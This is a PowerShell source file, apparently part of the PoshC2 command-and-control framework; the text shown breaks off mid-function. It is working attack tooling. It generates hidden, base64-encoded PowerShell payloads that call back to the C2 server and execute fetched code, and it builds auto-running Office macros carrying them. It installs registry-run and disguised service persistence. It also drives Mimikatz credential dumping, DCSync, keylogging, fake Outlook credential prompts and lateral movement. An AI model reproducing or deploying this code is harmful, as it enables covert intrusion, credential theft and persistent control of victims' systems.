<#
        .Synopsis
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .DESCRIPTION
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .EXAMPLE
        ImplantHandler -FolderPath C:\Temp\PoshC2-031120161055
#>
function Implant-Handler
{
    [CmdletBinding(DefaultParameterSetName = "FolderPath")]
    Param
    (
        [Parameter(ParameterSetName = "FolderPath", Mandatory = $true)]
        [string]
        $FolderPath
    )

    # initiate defaults
    $Database = "$FolderPath\PowershellC2.SQLite"
    $p = $env:PsModulePath
    $p += ";C:\temp\PowershellC2\"
    $global:randomuri = $null
    $global:cmdlineinput = 'PS >'
    $global:implants = $null
    $global:implantid = $null
    $global:command = $null
    [Environment]::SetEnvironmentVariable("PSModulePath",$p)
    Import-Module -Name PSSQLite

    $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
    $defaultbeacon = $c2serverresults.DefaultSleep
    $killdatefm = $c2serverresults.KillDate
    $IPAddress = $c2serverresults.HostnameIP 
    $ipv4address = $c2serverresults.HostnameIP
    $serverport = $c2serverresults.ServerPort 
    function startup 
    {
        Clear-Host
        $global:implants = $null
        $global:command = $null
        $global:randomuri = $null
        $global:implantid = $null
        $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE Alive='Yes'" -As PSObject
        $global:implants = $dbresults.RandomURI

        # while no implant is selected
        while ($global:randomuri -eq $null)
        {
            Clear-Host
            Write-Host -Object ""
            Write-Host -Object ".___.              .__.                __          " -ForegroundColor Green
            Write-Host -Object "|   | _____ ______ |  | _____    _____/  |_  ______" -ForegroundColor Green
            Write-Host -Object "|   |/     \\____ \|  | \__  \  /    \   __\/  ___/" -ForegroundColor Green
            Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
            Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
            Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
            Write-Host "=========== @benpturner & @davehardy20 ============"  -ForegroundColor Green
            Write-Host "===================================================" `n -ForegroundColor Green

            foreach ($implant in $dbresults) 
            { 
                $randomurihost = $implant.RandomURI
                $implantid = $implant.ImplantID
                $im_arch = $implant.Arch
                $im_user = $implant.User
                $im_hostname = $implant.Hostname
                $im_lastseen = $implant.LastSeen
                $im_pid = $implant.PID
                $im_sleep = $implant.Sleep
                $im_domain = $implant.Domain
                if ($randomurihost) {
                    if (((get-date).AddMinutes(-10) -gt $implant.LastSeen) -and ((get-date).AddMinutes(-59) -lt $implant.LastSeen)){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_hostname $im_domain ($im_arch)" -ForegroundColor Yellow
                    }
                    elseif ((get-date).AddMinutes(-59) -gt $implant.LastSeen){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_hostname $im_domain ($im_arch)" -ForegroundColor Red
                    }
                    else {
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_hostname $im_domain ($im_arch)" -ForegroundColor Green
                    } 
                }
            }

            $global:implantid = Read-Host -Prompt `n'Select ImplantID or ALL or Comma Separated List (Enter to refresh):'
            Write-Host -Object ""
            if (!$global:implantid) 
            {
                startup
            }
            if ($global:implantid -eq "ALL") 
            {
                $global:cmdlineinput = "PS $global:implantid>"
                break
            }
            else 
            {
                if ($global:implantid.Contains(",")){
                $global:cmdlineinput = "PS $global:implantid>"
                break 

                }
                $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$global:implantid'" -as SingleValue
                $global:cmdlineinput = "PS $global:implantid>"
            }
        }
    }
    $tick = "'"
    $speechmarks = '"'
    function print-help {
        write-host `n "Implant Features: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Beacon <time in seconds>"-ForegroundColor Green 
        write-host " Start-Sleep <time in seconds>"-ForegroundColor Green 
        write-host " Kill-Implant"-ForegroundColor Green 
        write-host " Hide-Implant"-ForegroundColor Green 
        write-host " Unhide-Implant"-ForegroundColor Green 
        write-host " Output-To-HTML"-ForegroundColor Green 
        write-host " Get-Proxy"-ForegroundColor Green 
        write-host " Systeminfo"-ForegroundColor Green 
        write-host " Unzip <source file> <destination folder>"-ForegroundColor Green 
        #write-host " Zip <destination zip file> <source folder>"-ForegroundColor Green 
        write-host " Get-System | Get-System-WithProxy" -ForegroundColor Green 
        write-host " Get-ImplantWorkingDirectory"-ForegroundColor Green
        write-host " Get-Pid " -ForegroundColor Green 
        write-host " ListModules " -ForegroundColor Green
        write-host " ModulesLoaded " -ForegroundColor Green 
        write-host " LoadModule <modulename>" -ForegroundColor Green 
        write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
        write-host " StartAnotherImplant" -ForegroundColor Green 
        write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
        write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
        write-host " Get-MSHotfix|Where-Object {$_.Installedon -gt ((Get-Date).Adddays(-2))}|Select-Object -Property Computername, KBArticle,InstalledOn, HotFixID, InstalledBy|ft -autosize" -ForegroundColor Green 
        write-host " Get-CreditCardData -Path C:\Backup\" -ForegroundColor Green
        write-host `n "Privilege Escalation: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Invoke-AllChecks" -ForegroundColor Green
        write-host ' Get-MSHotfix|Where-Object {$_.HotfixID -match "KB3139914"}' -ForegroundColor Green
        write-host " Invoke-MS16-032" -ForegroundColor Green 
        write-host " Invoke-MS16-032-ProxyPayload" -ForegroundColor Green 
        write-host " Get-GPPPassword" -ForegroundColor Green 
        write-host " Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'" -ForegroundColor Green
        write-host " Dir -Recurse | Select-String -pattern 'password='" -ForegroundColor Green
        write-host `n "File Management: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Download-File -Source C:\Temp\Run.exe" -ForegroundColor Green
        write-host " Upload-File -Source C:\Temp\Run.exe -Destination C:\Temp\Test.exe" -ForegroundColor Green  
        write-host " Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe' " -ForegroundColor Green 
        write-host `n "Persistence: " -ForegroundColor Green
        write-host "================" -ForegroundColor Red
        write-host " Install-Persistence | Remove-Persistence" -ForegroundColor Green 
        write-host " Install-ServiceLevel-Persistence | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Get-ExternalIP" -ForegroundColor Green
        write-host " Test-ADCredential -Domain test -User ben -Password Password1" -ForegroundColor Green  
        write-host " Net View | Net Users | Whoami /groups | Net localgroup administrators" -ForegroundColor Green  
        write-host " Invoke-ShareFinder -hostlist hosts.txt" -ForegroundColor Green
        write-host " Nltest /dclist:<domain> | Nltest /domain_trusts" -ForegroundColor Green 
        write-host ' Get-NetUser -Filter "(userprincipalname=*@testdomain.com)" | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
        write-host ' Get-NetGroup -GroupName "Domain Admins" | %{ Get-NetUser $_.membername } | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname' -ForegroundColor Green 
        write-host " Get-NetDomain | Get-NetDomainController | Get-NetDomainTrust" -ForegroundColor Green 
        write-host " Get-NetForest | Get-NetForestTrust | Get-NetForestDomain " -ForegroundColor Green
        write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
        write-host " Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)" -ForegroundColor Green
        write-host " Invoke-ShareFinder -CheckShareAccess" -ForegroundColor Green
        write-host " Find-InterestingFile -Path \\SERVER\Share -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)" -ForegroundColor Green
        write-host " Brute-AD" -ForegroundColor Green 
        write-host " Brute-LocAdmin -Username administrator" -ForegroundColor Green 
        Write-Host " Get-PassPol" -ForegroundColor Green
        Write-Host " Get-PassNotExp" -ForegroundColor Green
        Write-Host " Get-LocAdm" -ForegroundColor Green
        Write-Host " Invoke-RunAs -cmd 'powershell.exe' -args 'start-service -name WinRM' -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        write-host " Invoke-WMICommand -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass <pass> -command <cmd>" -ForegroundColor Green
        write-host " Invoke-WMIPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host " Invoke-WMIProxyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
        write-host "=========================================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::logonpasswords$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::lsa$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:44c2b4647c1ef4059915fgaf71311 /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Computer 10.0.0.1 -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:44c2b4647c1ef4059915fgaf71311 /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-TokenManipulation | Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String" -ForegroundColor Green
        write-host ' Invoke-TokenManipulation -ImpersonateUser -Username "Domain\User"' -ForegroundColor Green
        write-host `n "Credentials / Domain Controller Hashes: " -ForegroundColor Green
        write-host "============================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::dcsync /domain:domain.local /user:administrator$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-DCSync -PWDumpFormat" -ForegroundColor Green
        write-host `n "Useful Modules: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Get-Screenshot" -ForegroundColor Green 
        write-host " Get-RecentFiles" -ForegroundColor Green
        write-host " Cred-Popper" -ForegroundColor Green 
        write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
        write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
        write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
        write-host `n "Implant Handler: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Back" -ForegroundColor Green 
        write-host " Exit" `n -ForegroundColor Green 

    }

    # run startup function
    startup
    # call back command
    $command = '
    function Get-Webclient 
    {
    Param
    (
    [string]
    $Cookie
    )
    $wc = New-Object System.Net.WebClient; 
    $wc.UseDefaultCredentials = $true; 
    $wc.Proxy.Credentials = $wc.Credentials;
    if ($cookie) {
    $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
    }
    $wc
    }
    function primer
    {
    $whoami = (whoami) -replace "`r|`n"
    $pretext = [System.Text.Encoding]::Unicode.GetBytes("$whoami;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
    $pretext64 = [Convert]::ToBase64String($pretext)
    $primer = (Get-Webclient -Cookie $pretext64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
    $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
    $primer
    } 
    $primer = primer
    if ($primer) {$primer| iex} else {
    start-sleep 10
    primer | iex
    }
    '

    function Get-RandomURI 
    {
        param (
            [int]$Length
        )
        $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
        $result = ''
        for ($x = 0; $x -lt $Length; $x++) 
        {
            $result += $set | Get-Random
        }
        return $result
    }

    # create payloads
    function CreatePayload 
    {
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
        $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
        $payload = $payloadraw -replace "`n", ""
        [IO.File]::WriteAllLines("$FolderPath\payload.bat", $payload)

        Write-Host -Object "Payload written to: $FolderPath\payload.bat"  -ForegroundColor Green
    }

    # create macropayloads
    function CreateMacroPayload 
    {
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
        $payloadraw = [Convert]::ToBase64String($bytes)
        $payload = $payloadraw -replace "`n", ""
        $payloadbits = $null
        While ($payload)
        {
            $y = $payload[0..75] -join ''
            $payload = $payload -replace $y,''
            $payloadbits = $payloadbits +'str = str + "'+$y+'"'+"`n"
        }

        $macro = '
        Sub Auto_Open()
        UpdateMacro
        End Sub

        Sub AutoOpen()
        UpdateMacro
        End Sub

        Sub Workbook_Open()
        UpdateMacro
        End Sub

        Sub WorkbookOpen()
        UpdateMacro
        End Sub

        Sub Document_Open()
        UpdateMacro
        End Sub

        Sub DocumentOpen()
        UpdateMacro
        End Sub

        Sub UpdateMacro()
        Dim str As String
        Dim exec As String
        Dim wshShell

        Set wshShell = CreateObject("WScript.Shell")

        str = ""
'+$payloadbits+'

        exec = "p"
        exec = exec + "o"
        exec = exec + "w"
        exec = exec + "e"
        exec = exec + "r"
        exec = exec + "s"
        exec = exec + "h"
        exec = exec + "e"
        exec = exec + "l"
        exec = exec + "l"
        exec = exec + "."
        exec = exec + "e"
        exec = exec + "x"
        exec = exec + "e"
        exec = exec + " -exec bypass -windowstyle hidden -Noninteractive -e " & str

        Shell(exec)

        End Sub'

        [IO.File]::WriteAllLines("$FolderPath\macro.txt", $macro)

        Write-Host -Object "Payload written to: $FolderPath\macro.txt"  -ForegroundColor Green
    }

    # create proxypayloads
    function CreateProxyPayload 
    {
        param
        (
            [Object]
            $username,
            [Object]
            $password,
            [Object]
            $proxyurl
        )
        $command = '
            function Get-Webclient 
            {
            Param
            (
            [string]
            $Cookie
            )
            $username = "'+$username+'"
            $password = "'+$password+'"
            $proxyurl = "'+$proxyurl+'"
            $wc = New-Object System.Net.WebClient; 
    
            if ($proxyurl) {
            $wp = New-Object System.Net.WebProxy($proxyurl,$true); 
            $wc.Proxy = $wp;
            }

            if ($username -and $password) {
            $PSS = ConvertTo-SecureString $password -AsPlainText -Force; 
            $getcreds = new-object system.management.automation.PSCredential $username,$PSS; 
            $wp.Credentials = $getcreds;
            } else {
            $wc.UseDefaultCredentials = $true; 
            }

            if ($cookie) {
            $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
            }

            $wc
            } 
            function primer
            {
            $whoami = (whoami) -replace "`r|`n"
            $pretext = [System.Text.Encoding]::Unicode.GetBytes("$whoami;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
            $pretext64 = [Convert]::ToBase64String($pretext)
            $primer = (Get-Webclient -Cookie $pretext64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
            $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
            $primer
            } 
            $primer = primer
            if ($primer) {$primer| iex} else {
            start-sleep 10
            primer | iex
            }
        '
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
        $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
        $payload = $payloadraw -replace "`n", ""
        [IO.File]::WriteAllLines("$FolderPath\proxypayload.bat", $payload)

        Write-Host -Object "Payload written to: $FolderPath\proxypayload.bat"  -ForegroundColor Green
    }

function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

function Upload-File
{
    param
    (
        [string] $Source,
        [string] $Destination
    )
 
    $Source = Resolve-PathSafe $Source
     
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
     
    $reader = [System.IO.File]::OpenRead($Source)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    "Upload-File -Destination '$Destination' -Base64 $base64"
    $reader.Dispose()
}
function CheckModuleLoaded {
    param
    (
    [string] $ModuleName,
    [string] $IMRandomURI
    )
    $ModuleName = $ModuleName.ToLower();
    $modsloaded = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$IMRandomURI'" -As SingleValue
    if (!$modsloaded.contains("$ModuleName")){
        $modsloaded = $modsloaded + " $ModuleName"
        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='$modsloaded' WHERE RandomURI='$IMRandomURI'"|Out-Null
        $query = "INSERT INTO NewTasks (RandomURI, Command)
        VALUES (@RandomURI, @Command)"

        Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
            RandomURI = $IMRandomURI
            Command   = "LoadModule $ModuleName"
        } | Out-Null
    }
}

$head = '
<style>

body {
font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
}

table {
    table-layout: fixed;
    word-wrap: break-word;
    display: table;
    font-family: monospace;
    white-space: pre;
    margin: 1em 0;
}

th, td {
    text-align: left;
    padding: 8px;
}

tr:nth-child(even){background-color: #f2f2f2}

th {
    background-color: #4CAF50;
    color: white;
}
 
p { 
margin-left: 20px; 
font-size: 12px; 
}
 
</style>'

$header = '
<pre>
  __________            .__.     _________  ________  
  \_______  \____  _____|  |__   \_   ___ \ \_____  \ 
   |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ 
   |    |  (  <_> )___ \|   Y  \ \     \____/       \ 
   |____|   \____/____  >___|  /  \______  /\_______ \
                      \/     \/          \/         \/
  ============ @benpturner & @davehardy20 ============
  ====================================================
</pre>'

function runcommand {

param
(
[string] $pscommand,
[string] $psrandomuri
)
# alias list
            if ($pscommand)
            { 
                CheckModuleLoaded "Implant-Core.ps1" $psrandomuri
            }
            if ($pscommand -eq 'Get-ExternalIP') 
            {
                $pscommand = '(get-webclient).downloadstring("http://ipecho.net/plain")'
            }  
            if ($pscommand -eq 'getuid') 
            {
                $pscommand = 'whoami'
            }  
            if ($pscommand -eq 'ps') 
            {
                $pscommand = 'get-process'
            }
            if ($pscommand -eq 'id') 
            {
                $pscommand = 'whoami'
            }
            if ($pscommand -eq 'Kill-Implant') 
            {
                $pscommand = 'exit'
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$psrandomuri'"|Out-Null
            }
            if ($pscommand -eq 'get-pid') 
            {
                $pscommand = 'fvdsghfdsyyh'
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT PID FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'Get-ImplantWorkingDirectory') 
            {
                $pscommand = 'fvdsghfdsyyh'
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT FolderPath FROM C2Server" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'ListModules') 
            {
                $pscommand = 'fvdsghfdsyyh'
                Write-Host -Object ""
                $listmodules = Get-ChildItem -Path "C:\temp\PowershellC2\Modules" -Name
                foreach ($mod in $listmodules)
                {
                  Write-Host $mod
                }
                
                Write-Host -Object ""
            }  
            if ($pscommand -eq 'ModulesLoaded') 
            {
                $pscommand = 'fvdsghfdsyyh'
                $mods = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $mods
            }
            if ($pscommand -eq 'Remove-ServiceLevel-Persistence') 
            {
                $pscommand = "sc.exe delete CPUpdater"       
            }
            if ($pscommand -eq 'Install-ServiceLevel-Persistence') 
            {
                $payload = Get-Content -Path "$FolderPath\payload.bat"
                $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
            }
            if ($pscommand -eq 'Install-ServiceLevel-PersistenceWithProxy') 
            {
                if (Test-Path "$FolderPath\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\proxypayload.bat"
                    $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = 'fvdsghfdsyyh'
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmiproxypayload'))
            {
                if (Test-Path "$FolderPath\proxypayload.bat"){ 
                    CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIProxyPayload', 'Invoke-WMICommand'
                    $pscommand = $pscommand + " -command '$proxypayload'"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = 'fvdsghfdsyyh'
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
            {
                if (Test-Path "$FolderPath\payload.bat"){ 
                    CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
                    $payload = Get-Content -Path "$FolderPath\payload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMICommand'
                    $pscommand = $pscommand + " -command '$payload'"
                } else {
                    write-host "Can't find the payload.bat file, run CreatePayload first"
                    $pscommand = 'fvdsghfdsyyh'
                }
            }
            if ($pscommand -eq "Install-Persistence"){
$pscommand = '
Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777 -value "$payload"
Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate -value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper777"
$registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
$registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
if (($registrykey.IEUpdate) -and ($registrykey2.Wallpaper777)) {
Write-Output "Successfully installed persistence: `n Regkey: HKCU\Software\Microsoft\Windows\currentversion\run\IEUpdate `n Regkey2: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper777"
} else {
Write-Output "Error installing persistence"
}'
            }

            if ($pscommand -eq "Remove-Persistence"){
$pscommand = '
Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
$registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
$registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
if (($registrykey -eq $null) -and ($registrykey2 -eq $null)) {
Write-Output "Successfully removed persistence from registry!"
$error.clear()
} else {
Write-Output "Error removing persistence, remove registry keys manually!"
$error.clear()
}'            
            }
            if ($pscommand.ToLower().StartsWith('test-adcredential'))
            { 
                CheckModuleLoaded "Brute-ad.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-allchecks'))
            { 
                CheckModuleLoaded "Powerup.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-hostscan'))
            { 
                CheckModuleLoaded "Invoke-Hostscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-recentfiles'))
            { 
                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-tokenmanipulation'))
            { 
                CheckModuleLoaded "Invoke-TokenManipulation.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
            { 
                CheckModuleLoaded "Inveigh.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-net'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-mimikatz'))
            { 
                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-userhunter'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sharefinder'))
            { 
                CheckModuleLoaded "invoke-sharefinder.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-dcsync'))
            { 
                CheckModuleLoaded "Invoke-DCSync.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-keystrokes'))
            { 
                CheckModuleLoaded "Get-Keystrokes.ps1" $psrandomuri    
            }
            if ($pscommand.ToLower().StartsWith('invoke-portscan'))
            { 
                CheckModuleLoaded "Invoke-Portscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-mshotfix'))
            { 
                CheckModuleLoaded "Get-MSHotfix.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-gpppassword'))
            { 
                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-wmicommand'))
            {
                CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-ad'))
            {
                CheckModuleLoaded "brute-ad.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-locadmin'))
            {
                CheckModuleLoaded "brute-locadmin.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-passpol'))
            {
                CheckModuleLoaded "get-passpol.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-locadm'))
            {
                CheckModuleLoaded "get-locadm.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-runas'))
            {
                CheckModuleLoaded "invoke-runas.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-pass-notexp'))
            {
                CheckModuleLoaded "get-pass-notexp.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-winrmsession'))
            {
                CheckModuleLoaded "Invoke-WinRMSession.ps1" $psrandomuri
            }            
            if ($pscommand -eq 'StartAnotherImplantWithProxy') 
            {
                if (Test-Path "$FolderPath\proxypayload.bat"){ 
                $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"
                $proxypayload = $proxypayload -replace 'powershell ', ''
                $pscommand = "start-process powershell -args '"+$proxypayload+"'"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = 'fvdsghfdsyyh'
                }
            }
            if ($pscommand -eq 'StartAnotherImplant') 
            {
                $payload = Get-Content -Path "$FolderPath\payload.bat"
                $payload = $payload -replace 'powershell ', ''
                $pscommand = "start-process powershell -args '"+$payload+"'"
            }
            if ($pscommand.ToLower().StartsWith('get-proxy')) 
            {
                $pscommand = 'Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"'
            }
            if ($pscommand.ToLower().StartsWith('createmacropayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = 'fvdsghfdsyyh'
            }
            if ($pscommand.ToLower().StartsWith('createproxypayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = 'fvdsghfdsyyh'
            }
            if ($pscommand.ToLower().StartsWith('upload-file')) 
            {
                $output = Invoke-Expression $pscommand
                $pscommand = $output
            }
            if ($pscommand.ToLower().StartsWith('createpayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = 'fvdsghfdsyyh'
            }
            if ($pscommand -eq 'cred-popper') 
            {
                $pscommand = '$test = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $test.GetNetworkCredential().username; $test.GetNetworkCredential().password; '
                write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
            }
            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))) 
            {
                $sleeptime = $pscommand -replace 'sleep ', ''
                $sleeptime = $pscommand -replace 'beacon ', ''
                $pscommand = '$sleeptime = '+$sleeptime
                $query = "UPDATE Implants SET Sleep=@Sleep WHERE RandomURI=@RandomURI"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    Sleep = $sleeptime
                    RandomURI = $psrandomuri
                } | Out-Null
            }
            if ($pscommand -eq 'invoke-ms16-032')
            { 
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
